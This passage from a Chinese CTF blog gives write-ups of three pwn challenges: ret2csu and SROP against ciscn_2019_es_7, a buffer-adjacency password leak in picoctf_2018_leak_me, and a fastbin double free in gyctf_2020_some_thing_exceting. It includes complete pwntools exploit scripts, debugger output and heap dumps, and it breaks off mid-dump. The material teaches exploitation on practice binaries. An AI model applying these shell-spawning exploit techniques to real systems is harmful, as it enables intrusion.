<p> 其次，程序还可以泄漏信息，在输入0x10处和0x20处都存在栈上的地址，布置“/bin/sh”在上面，泄漏栈地址，即计算得到binsh的地址。</p>
<p> 为了程序正常返回继续利用，故泄漏0x20的地址。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7fffffffdee0</span><br><span class="line">0x7fffffffdee0:	0x6161616161616161	0x0000000000000a61#[rsp+buf]</span><br><span class="line">0x7fffffffdef0:	0x00007fffffffdf10	0x0000000000400536</span><br><span class="line">0x7fffffffdf00:	0x00007fffffffdff8	0x0000000100000000</span><br><span class="line">0x7fffffffdf10:	0x0000000000400540	0x00007ffff7a03bf7</span><br><span class="line">0x7fffffffdf20:	0x0000000000000001	0x00007fffffffdff8</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x30 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    00000010  ed 04 40 00  00 00 00 00  0a 05 40 00  00 00 00 00  │··@·│····│··@·│····│</span><br><span class="line">    00000020  a8 43 ed d1  fe 7f 00 00  00 00 00 00  01 00 00 00  │·C··│····│····│····│</span><br><span class="line">    00000030</span><br><span class="line">[+] 0x7ffed1ed4290</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ffed1ed4290</span><br><span class="line">0x7ffed1ed4290:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x7ffed1ed42a0:	0x00007ffed1ed42a0	0x000000000040050a</span><br><span class="line">0x7ffed1ed42b0:	0x00007ffed1ed43a8	0x0000000100000000</span><br></pre></td></tr></table></figure>

<h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>因为需要设置3个参数，需要利用万能gadget，但是注意一点是，第一个参数只能设置低8位，但是binsh的地址有12位，所以第一个参数还需要通过pop rdi，单独设置。</p>
<ol>
<li><p>布置“/bin/sh” =&gt; 地址通过上面已经泄漏</p>
</li>
<li><p>设置rax = 59</p>
</li>
<li><p>开始ret2cus</p>
<p>part1</p>
<p>​    rbx = 0，rbp = 1，跳出循环</p>
<p>​    call []，选择binsh+0x10的地址，也就是设置rax=59</p>
<p>​    设置3个参数，都为0即可</p>
<p>part2</p>
<p>​    ‘a’×0x56=&gt; 到达ret</p>
<p>​    设置第一个参数</p>
<p>syscall即可</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39; * 2 </span><br><span class="line">payload +&#x3D; p64(mov_rax_59)</span><br><span class="line">payload +&#x3D; p64(part1) </span><br><span class="line">payload +&#x3D; p64(0) + p64(1)</span><br><span class="line">payload +&#x3D; p64(binsh+0x10)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(part2)</span><br><span class="line">payload +&#x3D; &#39;a&#39;*56</span><br><span class="line">payload +&#x3D; p64(pop_rdi) + p64(binsh)</span><br><span class="line">payload +&#x3D; p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_2019_es_7"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",26076)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">mov_rax_59 = <span class="number">0x00004004E2</span></span><br><span class="line">part1 = <span class="number">0x0040059A</span></span><br><span class="line">part2 = <span class="number">0x000400580</span></span><br><span class="line">back = <span class="number">0x04004ED</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(mov_rax_59)</span><br><span class="line">payload += p64(part1) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(binsh+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(part2)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigFrame = SigreturnFrame()</span><br></pre></td></tr></table></figure>

<h5 id="设置寄存器"><a href="#设置寄存器" class="headerlink" title="设置寄存器"></a>设置寄存器</h5><ol>
<li>rax = execve调用号</li>
<li>rdi = binsh地址</li>
<li>rsi = 0</li>
<li>rdx = 0</li>
<li>rip = syscall</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sigFrame.rax = constants.SYS_execve</span><br><span class="line">sigFrame.rdi = binsh</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall</span><br></pre></td></tr></table></figure>

<h5 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h5><ol>
<li>发送“/bin/sh\x00”两个</li>
<li>gadget，这里会retn一下，让rsp下移</li>
<li>放上syscall，接着就放上str(sigFrame)【在rsp的下一个位置】</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(pop_rax_15)+p64(syscall)+str(sigFrame)</span><br></pre></td></tr></table></figure>

<h5 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_2019_es_7"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",26076)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">mov_rax_59 = <span class="number">0x00004004E2</span></span><br><span class="line">part1 = <span class="number">0x0040059A</span></span><br><span class="line">part2 = <span class="number">0x000400580</span></span><br><span class="line">back = <span class="number">0x04004ED</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">pop_rax_15 = <span class="number">0x004004DA</span></span><br><span class="line"></span><br><span class="line">sigFrame = SigreturnFrame()</span><br><span class="line">sigFrame.rax = constants.SYS_execve</span><br><span class="line">sigFrame.rdi = binsh</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall</span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(pop_rax_15)+p64(syscall)+str(sigFrame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本篇主要讲了些做题的点，思路更清晰了，，，，</p>
<ol>
<li>ret2csu比较好用了，这里特别注意execve使用的参数设置</li>
<li>srop主要发送str(sigFrame)在rsp下面一个，题目read和write都是[rsp+buf]为srop提供了便利</li>
</ol>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="ciscn_2019_es_7">附件</a></p>

	
	</div>
  <a type="button" href="/2021/05/06/ciscn-2019-es-7/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/01/picoctf-2018-leak-me详解/" >picoctf_2018_leak_me详解</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-01  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>虽然很简单，<del>但好像第一次碰见这样的题</del>，所以记录下。</p>
</blockquote>
<h3 id="反汇编问题"><a href="#反汇编问题" class="headerlink" title="反汇编问题"></a>反汇编问题</h3><p>问题：main函数f5的时候报如下错误</p>
<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234336628.png" alt="image-20210501234336628"></p>
<p>解决：</p>
<ol>
<li><p>找到报错的地址：0x8048705【按g输入地址即可】</p>
<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234523311.png" alt="image-20210501234523311"></p>
</li>
<li><p>双击函数，然后f5</p>
<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234614572.png" alt="image-20210501234614572"></p>
</li>
<li><p>然后就可以正常了</p>
</li>
</ol>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li>输入name</li>
<li>打印name</li>
<li>输入password</li>
<li>比较输入password和password</li>
<li>相同打印flag</li>
</ol>
<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234815805.png" alt="image-20210501234815805"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于name和password是紧挨着的，而且差距0x100。</p>
<p>如果name的长度为0x100，那么puts输出name的时候，就会把password一起带出来了。</p>
<p>而且name的最大长度可以达到0x100，故首先令name=0x100，即可泄露password，接着就可以得到flag了。</p>
<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234915134.png" alt="image-20210501234915134"></p>
<h4 id="获得password"><a href="#获得password" class="headerlink" title="获得password"></a>获得password</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26105)</span><br><span class="line">p.recvuntil(&quot;name?&quot;)</span><br><span class="line">p.sendline(&quot;a&quot;*0x100)</span><br><span class="line"># password &#x3D; &quot;a_reAllY_s3cuRe_p4s$word_f85406&quot;</span><br><span class="line"># p.sendline(password)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_f85406</span><br><span class="line"></span><br><span class="line">Incorrect Password!</span><br></pre></td></tr></table></figure>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26105</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># password = "a_reAllY_s3cuRe_p4s$word_f85406"</span></span><br><span class="line"><span class="comment"># p.sendline(password)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="PicoCTF_2018_leak-me">附件</a></p>

	
	</div>
  <a type="button" href="/2021/05/01/picoctf-2018-leak-me详解/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/01/gyctf-2020-some-thing-exceting详解/" >gyctf_2020_some_thing_exceting详解</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-01  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>还是高校战役的题，并且以前做过，，，，<del>但当时tcl，复现也不会，虽然现在也很菜</del></p>
<p>这里再重新写篇文章，记录下。</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/image-20210501212850010.png" alt="image-20210501212850010"></p>
<h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p>程序最开始进入了init函数</p>
<blockquote>
<p>init函数首先将flag读入了内存。</p>
<p>接着又将内存flag的数据读入了s，在0x6020a8中。</p>
<p>由于0x6020a0处设置了0x60，可以将fake chunk申请到这里，再读取块数据，即可得到flag</p>
</blockquote>
<p><img src="/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/image-20210501213125204.png" alt="image-20210501213125204"></p>
<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ol>
<li>create：创建一个指针chunk，里面存放了ba和na两个块的地址；创建ba和na，大小为0~0x70，fastbin大小内。</li>
<li>delete：free块，但是没有清零，可以double free，获得一定的地址读写能力</li>
<li>view：根据idx打印内容。</li>
</ol>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>两次create</li>
<li>free(0) -&gt; free(1) -&gt; free(0)</li>
<li>重新申请create2，此时修改2的内容，由于0和2是同一个地址，修改2，修改了0的内容，重新申请4的时候，就可以申请到想要的地址</li>
<li>修改2的内容为0x6020a0-0x8</li>
<li>create3，create4</li>
<li>4即申请到了0x6020a0的位置，打印其内容即为flag</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-保护"><a href="#0-保护" class="headerlink" title="0.保护"></a>0.保护</h4><blockquote>
<p>没开pie</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec gyctf_2020_some_thing_exceting </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_some_thing_exceting&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="1-两次创建"><a href="#1-两次创建" class="headerlink" title="1.两次创建"></a>1.两次创建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf74000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf74230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75240</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf752c0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75320</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75340</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf753a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaa'</span>,<span class="number">0x50</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaa'</span>,<span class="number">0x50</span>,<span class="string">'bbbb'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="2-double-free"><a href="#2-double-free" class="headerlink" title="2.double free"></a>2.double free</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ac000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ac230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad240</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x10ad320</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ad260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad2c0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad3a0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad320</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x10ad240</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad340</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad2c0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad3a0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad340</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ad400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x10ad240 —▸ 0x10ad320 ◂— 0x10ad240</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x10ad2c0 —▸ 0x10ad3a0 —▸ 0x10ad340 ◂— 0x10ad2c0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="3-create-3，并修改fd为fake-chunk"><a href="#3-create-3，并修改fd为fake-chunk" class="headerlink" title="3.create 3，并修改fd为fake chunk"></a>3.create 3，并修改fd为fake chunk</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce5000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce5230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span 